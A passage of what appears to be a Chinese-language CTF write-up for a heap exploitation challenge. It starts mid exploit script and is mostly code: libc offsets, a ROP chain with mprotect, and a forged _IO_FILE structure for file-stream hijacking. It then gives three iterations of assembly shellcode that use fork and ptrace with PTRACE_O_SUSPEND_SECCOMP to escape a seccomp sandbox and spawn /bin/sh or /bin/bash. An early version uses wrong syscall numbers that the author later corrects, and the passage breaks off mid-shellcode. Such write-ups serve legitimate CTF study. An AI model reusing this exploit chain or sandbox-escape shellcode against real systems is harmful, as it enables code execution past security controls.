class="line">fd=libcbase+<span class="number">0x21B110</span></span><br><span class="line">mprotect=libcbase+<span class="number">0x000116e60</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">main_arena=libc_addr<span class="number">-1504</span></span><br><span class="line">_IO_list_all=main_arena+<span class="number">0xa00</span></span><br><span class="line">libcbase=_IO_list_all<span class="number">-0x021b680</span></span><br><span class="line">_open=libcbase+<span class="number">0x001144e0</span></span><br><span class="line">openat2=libcbase+<span class="number">0x00000114640</span></span><br><span class="line">_write=libcbase+<span class="number">0x0114870</span></span><br><span class="line">_read=libcbase+<span class="number">0x0001147d0</span></span><br><span class="line">_IO_wfile_overflow =libcbase+<span class="number">0X0000086390</span></span><br><span class="line">IO_wfile_jumps=libcbase+<span class="number">0x0000000002170c0</span></span><br><span class="line">setcontext =libcbase+<span class="number">0x0000000539e0</span></span><br><span class="line">pop_rdi=libcbase+<span class="number">0x02a3e5</span></span><br><span class="line">pop_rsi=libcbase+<span class="number">0x171a12</span></span><br><span class="line">pop_rdx_rcx_rbx=libcbase+<span class="number">0X108b03</span></span><br><span class="line">pop_rdx_r12=libcbase+<span class="number">0x011f2e7</span></span><br><span class="line">sendmsg=libcbase+<span class="number">0x00000127950</span></span><br><span class="line">recvmsg=libcbase+<span class="number">0x00001277e0</span></span><br><span class="line">mprotect=libcbase+<span class="number">0x0011eaa0</span></span><br><span class="line">fd=libcbase+<span class="number">0x21B110</span></span><br><span class="line">pop_rsp_rbp=libcbase+<span class="number">0x0133b30</span></span><br><span class="line">pop_rbp=libcbase+<span class="number">0x0002a2e0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#gdb.attach(p)</span></span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x510</span>)</span><br><span class="line"></span><br><span class="line">new_addr=heapbase+<span class="number">0x1210</span></span><br><span class="line">heapaddr=heapbase+<span class="number">0x290</span></span><br><span class="line">edit(<span class="number">0</span>,p64(fd)*<span class="number">2</span>+p64(heap_addr)+p64(_IO_list_all<span class="number">-0x20</span>))</span><br><span class="line"><span class="built_in">free</span>(<span class="number">2</span>)#<span class="number">2</span></span><br><span class="line">add(<span class="number">6</span>,<span class="number">0x530</span>)</span><br><span class="line">iu=<span class="keyword">asm</span>(<span class="string">&quot;&quot;</span><span class="string">&quot;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">push 425</span></span><br><span class="line"><span class="string">pop rax</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;</span><span class="string">&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">stack_heap=heapbase+<span class="number">0x2000</span>+<span class="number">0x650</span></span><br><span class="line">fake_io_addr=heapbase+<span class="number">0xcf0</span> # 伪造的fake_IO结构体的地址</span><br><span class="line">next_chain = <span class="number">0</span></span><br><span class="line">fake_IO_FILE=p64(<span class="number">0x0</span>)#这个并不是_flag也不是rdi         #_flags=rdi</span><br><span class="line">fake_IO_FILE+=p64(<span class="number">0</span>)*<span class="number">5</span></span><br><span class="line">fake_IO_FILE +=p64(<span class="number">1</span>)+p64(<span class="number">2</span>) <span class="meta"># rcx!=0(FSOP)</span></span><br><span class="line">fake_IO_FILE +=p64(fake_io_addr+<span class="number">0x100</span>)#_IO_backup_base=rdx</span><br><span class="line">fake_IO_FILE +=p64(setcontext+<span class="number">61</span>)#_IO_save_end=call addr(call setcontext/system)</span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0x68</span><span class="number">-0x10</span>, b<span class="number">&#x27;</span>\x00<span class="number">&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)  # _chain</span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0x88</span><span class="number">-0x10</span>, b<span class="number">&#x27;</span>\x00<span class="number">&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(fake_io_addr+<span class="number">0x400</span>)  # _lock = a writable address</span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0xa0</span><span class="number">-0x10</span>, b<span class="number">&#x27;</span>\x00<span class="number">&#x27;</span>)</span><br><span class="line">fake_IO_FILE +=p64(fake_io_addr+<span class="number">0x30</span>)#_wide_data,rax1_addr</span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0xc0</span><span class="number">-0x10</span>, b<span class="number">&#x27;</span>\x00<span class="number">&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(<span class="number">1</span>) <span class="meta">#mode=1</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0xd8</span><span class="number">-0x10</span>, b<span class="number">&#x27;</span>\x00<span class="number">&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(IO_wfile_jumps+<span class="number">0x30</span>)  <span class="meta"># vtable=IO_wfile_jumps+0x10</span></span><br><span class="line">fake_IO_FILE +=p64(<span class="number">0</span>)*<span class="number">6</span></span><br><span class="line">fake_IO_FILE += p64(fake_io_addr+<span class="number">0x40</span>)  # rax2_addr</span><br><span class="line">fake_IO_FILE+=b<span class="string">&quot;./flag\x00\x00&quot;</span></span><br><span class="line">qwq=b<span class="number">&#x27;</span>\x00<span class="number">&#x27;</span>*<span class="number">0x68</span>+p64(fake_io_addr+<span class="number">0xF8</span>)+p64(fake_io_addr+<span class="number">0x200</span>)+p64(fake_io_addr+<span class="number">0x200</span>)</span><br><span class="line">qwq+=p64(fake_io_addr+<span class="number">0x200</span>)+p64(pop_rdi)</span><br><span class="line">qwq=qwq.ljust(<span class="number">0xa0</span>,b<span class="number">&#x27;</span>\x00<span class="number">&#x27;</span>)</span><br><span class="line">qwq+=p64(<span class="number">0xdeadbeef</span>)+p64(<span class="number">0xdeadbeef</span>)+b<span class="number">&#x27;</span>\x00<span class="number">&#x27;</span>*<span class="number">0x28</span></span><br><span class="line">ROP=p64(pop_rdi)+p64(heapbase+<span class="number">0x1000</span>)+p64(pop_rsi)+p64(<span class="number">0x2000</span>)+p64(pop_rdx_rcx_rbx)+p64(<span class="number">7</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(mprotect)+p64(pop_rbp)+p64(stack_heap+<span class="number">0x488</span>)+p64(new_addr+<span class="number">0x10</span>)<span class="meta">#</span></span><br><span class="line"><span class="meta">qwq+=ROP</span></span><br><span class="line">fake_IO_FILE+=qwq</span><br><span class="line"><span class="meta">#gdb.attach()</span></span><br><span class="line">edit(<span class="number">2</span>,fake_IO_FILE)</span><br><span class="line"><span class="meta">#gdb.attach(p,<span class="string">&quot;b _IO_switch_to_wget_mode&quot;</span>)</span></span><br><span class="line">edit(<span class="number">4</span>,shellcode)</span><br><span class="line">add(<span class="number">7</span>,<span class="number">0x900</span>)</span><br><span class="line">cmd(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">print(<span class="string">&quot;libc_addr&quot;</span>,hex(libc_addr))</span><br><span class="line">print(<span class="string">&quot;libcbase:&quot;</span>,hex(libcbase))</span><br><span class="line">print(<span class="string">&quot;heapbase:&quot;</span>,hex(heapbase))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>程序的沙盒状态如下</p><p><img src="https://xswlhhh12345-blog-test.oss-cn-guangzhou.aliyuncs.com/img/1726111417293-c9c0dab2-a03b-43ef-8077-3c444b56027c.png" alt="img"></p><p>一开始本来想用openat2，但是因为Linux内核5.6才有openat2的引入，远程发现是5.4的版本左右，所以是不支持openat2的。</p><p>不清楚本地的flag是否在当前目录下，..&#x2F;  &#x2F;  ..&#x2F;..&#x2F;目录我都找过，但是无济于事</p><p>所以只能另辟蹊径，一开始聚焦于io_uring的利用，但是本人没有仔细研究，所以抄了几家shellcode也就放弃了，听Qanux师傅说本地能通，但是远程不能通。回到沙盒状态，我们注意到被禁用的系统调用并不是直接kill，而是一个TRACE，这意味着如果我们可能追踪回这个进程并加以利用。</p><p>如何做？</p><p>我们需要用ptrace系统调用（系统调用号：101）去追回，下面是我们暂停seccomp所需要的request和对应的选项</p><p><strong>PTRACE_SETOPTIONS</strong>(since Linux 2.4.6; see BUGS for caveats)</p><p><strong>PTRACE_O_SUSPEND_SECCOMP</strong>(since Linux 4.3)选项</p><p>暂停tracee的seccomp保护。这适用于任何模式，并且可以在示踪尚未安装seccomp筛选器时使用。也就是说，一个有效的用例是在被跟踪安装之前，暂停被跟踪的seccomp保护，让被跟踪安装过滤器，然后在恢复过滤器时清除此标志。设置此选项要求跟踪器具有CAP_SYS_ADMIN功能，未安装任何seccomp保护，并且自身未设置PTRACE_O_SUSPEND_SECCOMP。</p><p>那我们的代码执行流程就有了，首先fork一个子进程，我们尝试在子进程中执行execve的代码</p><p>然后父进程wait等待子进程返回信号，如果返回信号应该是子进程的TRACEME选项起作用了，下一句就是execve的代码。父进程此时attach过去接管子进程，然后顺便把子进程的沙盒关了，那么我们此时的子进程就会执行execve不受阻拦并替代为对应的shell。</p><h3 id="shellcode-v-1"><a href="#shellcode-v-1" class="headerlink" title="shellcode v.1"></a>shellcode v.1</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">pid = fork()</span><br><span class="line"><span class="keyword">if</span> (!pid)</span><br><span class="line">&#123;<span class="comment">//子进程</span></span><br><span class="line">    ptrace(PTRACE_TRACEME,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">    execve(<span class="string">&quot;/bin/sh\x00&quot;</span>,<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="comment">//父进程</span></span><br><span class="line">    waitpid(pid,<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">    ptrace(PTRACE_ATTACH,pid,<span class="number">0</span>,<span class="number">0</span>)</span><br><span class="line">    ptrace(PTRACE_O_SUSPEND_SECCOMP,pid,<span class="number">0</span>,<span class="number">0</span>)</span><br><span class="line">    ptrace(PTRACE_CONT,pid,<span class="number">0</span>,<span class="number">0</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>下面是AI根据我们伪代码写的汇编代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line">_start:</span><br><span class="line">    ; fork() system call</span><br><span class="line">    mov rax, <span class="number">57</span>          ; syscall number <span class="keyword">for</span> <span class="title function_">fork</span><span class="params">()</span></span><br><span class="line">    syscall</span><br><span class="line">    test rax, rax        ; check <span class="keyword">if</span> the result is <span class="number">0</span></span><br><span class="line">    mov r15,rax</span><br><span class="line">    jz child_process     ; jump to child process code <span class="keyword">if</span> result is <span class="number">0</span></span><br><span class="line"></span><br><span class="line">parent_process:</span><br><span class="line">    ; waitpid() system call</span><br><span class="line">    mov rax, <span class="number">7</span>          ; syscall number <span class="keyword">for</span> <span class="title function_">waitpid</span><span class="params">()</span></span><br><span class="line">    mov rdi, r15        ; pid (use the pid from fork)</span><br><span class="line">    xor rsi, rsi        ; options</span><br><span class="line">    xor rdx, rdx        ; status</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    ; ptrace(PTRACE_ATTACH, pid, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">    mov rax, <span class="number">257</span>        ; syscall number <span class="keyword">for</span> <span class="title function_">ptrace</span><span class="params">()</span></span><br><span class="line">    mov rdi, 16         ; request type PTRACE_ATTACH</span><br><span class="line">    mov rsi, r15        ; pid</span><br><span class="line">    xor rdx, rdx        ; address</span><br><span class="line">    xor r10, r10        ; data</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    ; ptrace(PTRACE_O_SUSPEND_SECCOMP, pid, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">    mov rax, <span class="number">257</span>        ; syscall number <span class="keyword">for</span> <span class="title function_">ptrace</span><span class="params">()</span></span><br><span class="line">    mov rdi, 0x42000003 ; request type PTRACE_O_SUSPEND_SECCOMP</span><br><span class="line">    mov rsi, r15        ; pid</span><br><span class="line">    xor rdx, rdx        ; address</span><br><span class="line">    xor r10, r10        ; data</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    ; ptrace(PTRACE_COUT, pid, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">    mov rax, <span class="number">257</span>        ; syscall number <span class="keyword">for</span> <span class="title function_">ptrace</span><span class="params">()</span></span><br><span class="line">    mov rdi, 0x7; request type PTRACE_O_SUSPEND_SECCOMP</span><br><span class="line">    mov rsi, r15        ; pid</span><br><span class="line">    xor rdx, rdx        ; address</span><br><span class="line">    xor r10, r10        ; data</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    ; Exit</span><br><span class="line">    mov rax, <span class="number">60</span>         ; syscall number <span class="keyword">for</span> <span class="title function_">exit</span><span class="params">()</span></span><br><span class="line">    xor rdi, rdi        ; status</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">child_process:</span><br><span class="line">    ; ptrace(TRACE_ME, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">    mov rax, <span class="number">257</span>        ; syscall number <span class="keyword">for</span> <span class="title function_">ptrace</span><span class="params">()</span></span><br><span class="line">    mov rdi, 0          ; request type TRACE_ME</span><br><span class="line">    xor rsi, rsi        ; pid</span><br><span class="line">    xor rdx, rdx        ; address</span><br><span class="line">    xor r10, r10        ; data</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    ; execve(<span class="string">&quot;/bin/sh&quot;</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>)</span><br><span class="line">    mov rax, <span class="number">59</span>         ; syscall number <span class="keyword">for</span> <span class="title function_">execve</span><span class="params">()</span></span><br><span class="line">    push 0              ; <span class="literal">NULL</span> <span class="keyword">for</span> envp</span><br><span class="line">    push <span class="number">0</span>              ; <span class="literal">NULL</span> <span class="keyword">for</span> argv</span><br><span class="line">    mov rbx, <span class="number">0x68732f6e69622f</span> ; <span class="string">&quot;/bin//sh&quot;</span> in reverse</span><br><span class="line">    push rbx            ; push the address of <span class="string">&quot;/bin//sh&quot;</span> onto the <span class="built_in">stack</span></span><br><span class="line">    mov rdi, rsp        ; pointer to the argument <span class="built_in">array</span></span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    ; Exit <span class="keyword">if</span> execve fails</span><br><span class="line">    mov rax, <span class="number">60</span>         ; syscall number <span class="keyword">for</span> <span class="title function_">exit</span><span class="params">()</span></span><br><span class="line">    xor rdi, rdi        ; status</span><br><span class="line">    syscall</span><br></pre></td></tr></table></figure><p>去注释版本</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">    mov rax, <span class="number">57</span></span><br><span class="line">    syscall</span><br><span class="line">    test rax, rax</span><br><span class="line">    mov r15, rax</span><br><span class="line">    jz child_process</span><br><span class="line"></span><br><span class="line">parent_process:</span><br><span class="line">    mov rax, <span class="number">7</span></span><br><span class="line">    mov rdi, r15</span><br><span class="line">    xor rsi, rsi</span><br><span class="line">    xor rdx, rdx</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    mov rax, <span class="number">257</span></span><br><span class="line">    mov rdi, <span class="number">16</span></span><br><span class="line">    mov rsi, r15</span><br><span class="line">    xor rdx, rdx</span><br><span class="line">    xor r10, r10</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    mov rax, <span class="number">257</span></span><br><span class="line">    mov rdi, <span class="number">0x42000003</span></span><br><span class="line">    mov rsi, r15</span><br><span class="line">    xor rdx, rdx</span><br><span class="line">    xor r10, r10</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    mov rax, <span class="number">257</span></span><br><span class="line">    mov rdi, <span class="number">0x7</span></span><br><span class="line">    mov rsi, r15</span><br><span class="line">    xor rdx, rdx</span><br><span class="line">    xor r10, r10</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    mov rax, <span class="number">60</span></span><br><span class="line">    xor rdi, rdi</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">child_process:</span><br><span class="line">    mov rax, <span class="number">257</span></span><br><span class="line">    mov rdi, <span class="number">0</span></span><br><span class="line">    xor rsi, rsi</span><br><span class="line">    xor rdx, rdx</span><br><span class="line">    xor r10, r10</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    mov rax, <span class="number">59</span></span><br><span class="line">    push <span class="number">0</span></span><br><span class="line">    push <span class="number">0</span></span><br><span class="line">    mov rbx, <span class="number">0x68732f6e69622f</span></span><br><span class="line">    push rbx</span><br><span class="line">    mov rdi, rsp</span><br><span class="line">    xor rsi,rsi</span><br><span class="line">    xor rdx,rdx</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    mov rax, <span class="number">60</span></span><br><span class="line">    xor rdi, rdi</span><br><span class="line">    syscall</span><br></pre></td></tr></table></figure><p>如果只是这样shellcode没有达到想要的结果<img src="https://xswlhhh12345-blog-test.oss-cn-guangzhou.aliyuncs.com/img/1726211709806-93e54516-2188-475d-b6d6-26cbd6a1af77.png" alt="img"></p><p>因为我们的TRACEME和ATTCH实际上取得的是同一个效果，我看Qanux爷的exp，它让子进程sleep了一段时间，我们据此进行改进</p><h3 id="shellcode-v-2"><a href="#shellcode-v-2" class="headerlink" title="shellcode v.2"></a>shellcode v.2</h3><p>实际上对子进程的监测和管理都是放在一个死循环里的，我们得往shellcode代码里面加一个死循环</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">pid = fork()</span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span> (!pid)</span><br><span class="line">    &#123;<span class="comment">//子进程</span></span><br><span class="line">        nanosleep(&amp;[<span class="number">5</span>,<span class="number">1</span>],<span class="number">0</span>)</span><br><span class="line">        execve(<span class="string">&quot;/bin/sh\x00&quot;</span>,<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="comment">//父进程</span></span><br><span class="line">        waitpid(pid,<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">        ptrace(PTRACE_ATTACH,pid,<span class="number">0</span>,<span class="number">0</span>)</span><br><span class="line">        ptrace(PTRACE_O_SUSPEND_SECCOMP,pid,<span class="number">0</span>,<span class="number">0</span>)</span><br><span class="line">        ptrace(PTRACE_CONT,pid,<span class="number">0</span>,<span class="number">0</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>对应的shellcode如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">    mov rax, <span class="number">57</span></span><br><span class="line">    syscall</span><br><span class="line">    test rax, rax</span><br><span class="line">    mov r15, rax</span><br><span class="line">    jz child_process</span><br><span class="line"></span><br><span class="line">parent_process:</span><br><span class="line">    mov rax, <span class="number">7</span></span><br><span class="line">    mov rdi, r15</span><br><span class="line">    xor rsi, rsi</span><br><span class="line">    xor rdx, rdx</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    mov rax, <span class="number">101</span></span><br><span class="line">    mov rdi, <span class="number">16</span></span><br><span class="line">    mov rsi, r15</span><br><span class="line">    xor rdx, rdx</span><br><span class="line">    xor r10, r10</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">monitor_child:</span><br><span class="line">    mov rax, <span class="number">101</span></span><br><span class="line">    mov rdi, <span class="number">0x42000003</span></span><br><span class="line">    mov rsi, r15</span><br><span class="line">    xor rdx, rdx</span><br><span class="line">    xor r10, r10</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    mov rax, <span class="number">101</span></span><br><span class="line">    mov rdi, <span class="number">0x7</span></span><br><span class="line">    mov rsi, r15</span><br><span class="line">    xor rdx, rdx</span><br><span class="line">    xor r10, r10</span><br><span class="line">    syscall</span><br><span class="line">jmp monitor_child</span><br><span class="line"></span><br><span class="line">child_process:</span><br><span class="line">    mov rax,<span class="number">35</span></span><br><span class="line">    push <span class="number">1</span></span><br><span class="line">    dec byte ptr [rsp]</span><br><span class="line">    push <span class="number">5</span></span><br><span class="line">    mov rdi,rsp</span><br><span class="line">    xor rsi,rsi</span><br><span class="line">    syscall</span><br><span class="line">    </span><br><span class="line">    mov rax, <span class="number">59</span></span><br><span class="line">    mov rbx, <span class="number">0x68732f6e69622f</span></span><br><span class="line">    push rbx</span><br><span class="line">    mov rdi, rsp</span><br><span class="line">    xor rsi,rsi</span><br><span class="line">    xor rdx,rdx</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    jmp child_process</span><br><span class="line">    mov rax, <span class="number">60</span></span><br><span class="line">    xor rdi, rdi</span><br><span class="line">    syscall</span><br></pre></td></tr></table></figure><p><img src="https://xswlhhh12345-blog-test.oss-cn-guangzhou.aliyuncs.com/img/1726212749197-6b4ebf41-fb80-4677-a0a3-5d0bfe0553e9.png" alt="img"></p><p>虽然是有shell的提示但是输入指令是没有回显的，比如echo *都没有回显</p><h3 id="shellcode-v-3"><a href="#shellcode-v-3" class="headerlink" title="shellcode v.3"></a>shellcode v.3</h3><p>再次对比Qanux的exp，发现用的是&#x2F;bin&#x2F;bash\x00。</p><p>然后发现wait是在PTRACE_ATTACH之后才调用的，调整下顺序，果然出了。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line">order2 = b<span class="number">&#x27;</span>h\x00<span class="number">&#x27;</span>[::<span class="number">-1</span>].hex()</span><br><span class="line">order1 = b<span class="number">&#x27;</span>/bin/bas<span class="number">&#x27;</span>[::<span class="number">-1</span>].hex()</span><br><span class="line">shellcode=<span class="keyword">asm</span>(f<span class="string">&quot;&quot;</span><span class="string">&quot;</span></span><br><span class="line"><span class="string">    mov rax, 57</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    test rax,rax</span></span><br><span class="line"><span class="string">    mov r15, rax</span></span><br><span class="line"><span class="string">    cmp rax, 0</span></span><br><span class="line"><span class="string">    je child_process</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">parent_process:</span></span><br><span class="line"><span class="string">    mov rax, 101</span></span><br><span class="line"><span class="string">    mov rdi, 16</span></span><br><span class="line"><span class="string">    mov rsi, r15</span></span><br><span class="line"><span class="string">    xor rdx, rdx</span></span><br><span class="line"><span class="string">    xor r10, r10</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    mov rax, 61</span></span><br><span class="line"><span class="string">    mov rdi, r15</span></span><br><span class="line"><span class="string">    mov rsi,rsp</span></span><br><span class="line"><span class="string">    xor rdx, rdx</span></span><br><span class="line"><span class="string">    xor r10,r10</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">monitor_child:</span></span><br><span class="line"><span class="string">    mov rax, 101</span></span><br><span class="line"><span class="string">    mov rdi, 0x4200</span></span><br><span class="line"><span class="string">    mov rsi, r15</span></span><br><span class="line"><span class="string">    xor rdx, rdx</span></span><br><span class="line"><span class="string">    mov r10, 0x00000080</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    mov rax, 101</span></span><br><span class="line"><span class="string">    mov rdi, 0x7</span></span><br><span class="line"><span class="string">    mov rsi, r15</span></span><br><span class="line"><span class="string">    xor rdx, 